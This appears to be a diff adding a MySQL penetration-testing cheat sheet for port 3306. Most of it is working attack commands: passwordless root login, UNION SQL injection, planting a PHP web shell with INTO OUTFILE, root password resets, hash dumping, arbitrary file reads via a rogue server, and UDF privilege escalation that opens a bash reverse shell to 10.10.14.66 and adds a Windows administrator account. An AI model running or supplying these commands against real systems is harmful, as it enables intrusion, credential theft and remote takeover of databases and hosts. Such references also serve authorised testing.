@@ -1,0 +1,297 @@
+
+Default port: 3306
+
+3306/tcp open  mysql
+
+mysql -u root # Connect to root without password
+mysql -u root -p # A password will be asked (check someone)
+Remote
+mysql -h <Hostname> -u root
+mysql -h <Hostname> -u root@localhost
+External Enumeration
+Some of the enumeration actions require valid credentials
+
+CONVERT(unhex("6f6e2e786d6c55540900037748b75c7249b75"), BINARY)
+CONVERT(from_base64("aG9sYWFhCg=="), BINARY)
+
+MySQL commands
+show databases;
+use <database>;
+connect <database>;
+show tables;
+describe <table_name>;
+show columns from <table>;
+
+select version(); #version
+select @@version(); #version
+select user(); #User
+select database(); #database name
+
+#Get a shell with the mysql client user
+\! sh
+
+#Basic MySQLi
+Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
+Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"
+
+#Read & Write
+## Yo need FILE privilege to read & write to files.
+select load_file('/var/lib/mysql-files/key.txt'); #Read file
+select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
+
+#Try to change MySQL root password
+UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
+UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
+FLUSH PRIVILEGES;
+quit;
+
+mysql -u username -p < manycommands.sql #A file with all the commands you want to execute
+mysql -u root -h 127.0.0.1 -e 'show databases;'
+
+MySQL Permissions Enumeration
+SHOW GRANTS [FOR user];
+SHOW GRANTS;
+SHOW GRANTS FOR 'root'@'localhost';
+SHOW GRANTS FOR CURRENT_USER();
+
+# Get users, permissions & hashes
+SELECT * FROM mysql.user;
+
+#From DB
+select * from mysql.user where user='root'; 
+## Get users with file_priv
+select user,file_priv from mysql.user where file_priv='Y';
+## Get users with Super_priv
+select user,Super_priv from mysql.user where Super_priv='Y';
+
+# List functions
+SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
+#@ Functions not from sys. db
+SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
+You can see in the docs the meaning of each privilege: https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html
+
+MySQL File RCE
+PAGE
+MySQL File priv to SSRF/RCE
+MySQL arbitrary read file by client
+Actually, when you try to load data local into a table the content of a file the MySQL or MariaDB server asks the client to read it and send the content. Then, if you can tamper a mysql client to connect to your own MySQL server, you can read arbitrary files.
+Please notice that this is the behaviour using:
+load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
+(Notice the "local" word)
+Because without the "local" you can get:
+mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
+
+ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
+Initial PoC: https://github.com/allyshka/Rogue-MySql-Server
+In this paper you can see a complete description of the attack and even how to extend it to RCE: https://paper.seebug.org/1113/
+Here you can find an overview of the attack: http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/
+
+​Mysql User
+It will be very interesting if mysql is running as root:
+
+
+cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
+systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1
+
+Dangerous Settings of mysqld.cnf
+In the configuration of MySQL services, various settings are employed to define its operation and security measures:
+The user setting is utilized for designating the user under which the MySQL service will be executed.
+password is applied for establishing the password associated with the MySQL user.
+
+admin_address
+ specifies the IP address that listens for TCP/IP connections on the administrative network interface.
+The debug variable 
+is indicative of the present debugging configurations, including sensitive information within logs.
+sql_warnings
+ manages whether information strings are generated for single-row INSERT statements when warnings emerge, containing sensitive data within logs.
+With 
+secure_file_priv
+, the scope of data import and export operations is constrained to enhance security.
+
+Privilege escalation
+# Get current user (an all users) privileges and hashes
+
+use mysql;
+select user();
+select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;
+
+# Get users, permissions & creds
+SELECT * FROM mysql.user;
+mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"
+
+# Create user and give privileges
+create user test identified by 'test';
+grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;
+
+# Get a shell (with your permissions, usefull for sudo/suid privesc)
+\! sh
+Privilege Escalation via library
+If the mysql server is running as root (or a different more privileged user) you can make it execute commands. For that, you need to use user defined functions. And to create a user defined you will need a library for the OS that is running mysql.
+
+The malicious library to use can be found inside sqlmap and inside metasploit by doing 
+locate "*lib_mysqludf_sys*"
+. The 
+.so
+ files are linux libraries and the 
+.dll
+ are the Windows ones, choose the one you need.
+
+If you don't have those libraries, you can either look for them, or download this linux C code and compile it inside the linux vulnerable machine:
+
+gcc -g -c raptor_udf2.c
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+Now that you have the library, login inside the Mysql as a privileged user (root?) and follow the next steps:
+
+Linux
+# Use a database
+use mysql;
+# Create a table to load the library and move it to the plugins dir
+create table npn(line blob);
+# Load the binary library inside the table
+## You might need to change the path and file name
+insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
+# Get the plugin_dir path
+show variables like '%plugin%';
+# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
+# dump in there the library
+select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
+# Create a function to execute commands
+create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+# Execute commands
+select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
+select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
+
+
+
+Windows
+# CHech the linux comments for more indications
+USE mysql;
+CREATE TABLE npn(line blob);
+INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
+show variables like '%plugin%';
+SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
+CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
+SELECT sys_exec("net user npn npn12345678 /add");
+SELECT sys_exec("net localgroup Administrators npn /add");
+Extracting MySQL credentials from files
+Inside /etc/mysql/debian.cnf you can find the plain-text password of the user debian-sys-maint
+
+cat /etc/mysql/debian.cnf
+You can use these credentials to login in the mysql database.
+Inside the file: /var/lib/mysql/mysql/user.MYD you can find all the hashes of the MySQL users (the ones that you can extract from mysql.user inside the database).
+
+You can extract them doing:
+grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
+Enabling logging
+You can enable logging of mysql queries inside /etc/mysql/my.cnf uncommenting the following lines
+Useful files
+Configuration Files
+
+windows *
+config.ini
+my.ini
+
+windows\my.ini
+winnt\my.ini
+<InstDir>/mysql/data/
+
+unix
+my.cnf
+/etc/my.cnf
+/etc/mysql/my.cnf
+/var/lib/mysql/my.cnf
+~/.my.cnf
+/etc/my.cnf
+
+Command History
+~/.mysql.history
+
+Log Files
+connections.log
+update.log
+common.log
+
+-------------------------------------
+Default MySQL Database/Tables
+information_schema
+mysql
+performance_schema
+sys
+ALL_PLUGINS
+APPLICABLE_ROLES
+CHARACTER_SETS
+CHECK_CONSTRAINTS
+COLLATIONS
+COLLATION_CHARACTER_SET_APPLICABILITY
+COLUMNS
+COLUMN_PRIVILEGES
+ENABLED_ROLES
+ENGINES
+EVENTS
+FILES
+GLOBAL_STATUS
+GLOBAL_VARIABLES
+KEY_COLUMN_USAGE
+KEY_CACHES
+OPTIMIZER_TRACE
+PARAMETERS
+PARTITIONS
+PLUGINS
+PROCESSLIST
+PROFILING
+REFERENTIAL_CONSTRAINTS
+ROUTINES
+SCHEMATA
+SCHEMA_PRIVILEGES
+SESSION_STATUS
+SESSION_VARIABLES
+STATISTICS
+SYSTEM_VARIABLES
+TABLES
+TABLESPACES
+TABLE_CONSTRAINTS
+TABLE_PRIVILEGES
+TRIGGERS
+USER_PRIVILEGES
+VIEWS
+INNODB_LOCKS
+INNODB_TRX
+INNODB_SYS_DATAFILES
+INNODB_FT_CONFIG
+INNODB_SYS_VIRTUAL
+INNODB_CMP
+INNODB_FT_BEING_DELETED
+INNODB_CMP_RESET
+INNODB_CMP_PER_INDEX
+INNODB_CMPMEM_RESET
+INNODB_FT_DELETED
+INNODB_BUFFER_PAGE_LRU
+INNODB_LOCK_WAITS
+INNODB_TEMP_TABLE_INFO
+INNODB_SYS_INDEXES
+INNODB_SYS_TABLES
+INNODB_SYS_FIELDS
+INNODB_CMP_PER_INDEX_RESET
+INNODB_BUFFER_PAGE
+INNODB_FT_DEFAULT_STOPWORD
+INNODB_FT_INDEX_TABLE
+INNODB_FT_INDEX_CACHE
+INNODB_SYS_TABLESPACES
+INNODB_METRICS
+INNODB_SYS_FOREIGN_COLS
+INNODB_CMPMEM
+INNODB_BUFFER_POOL_STATS
+INNODB_SYS_COLUMNS
+INNODB_SYS_FOREIGN
+INNODB_SYS_TABLESTATS
+GEOMETRY_COLUMNS
+SPATIAL_REF_SYS
+CLIENT_STATISTICS
+INDEX_STATISTICS
+USER_STATISTICS
+INNODB_MUTEXES
+TABLE_STATISTICS
+INNODB_TABLESPACES_ENCRYPTION
+user_variables
+INNODB_TABLESPACES_SCRUBBING
+INNODB_SYS_SEMAPHORE_WAITS
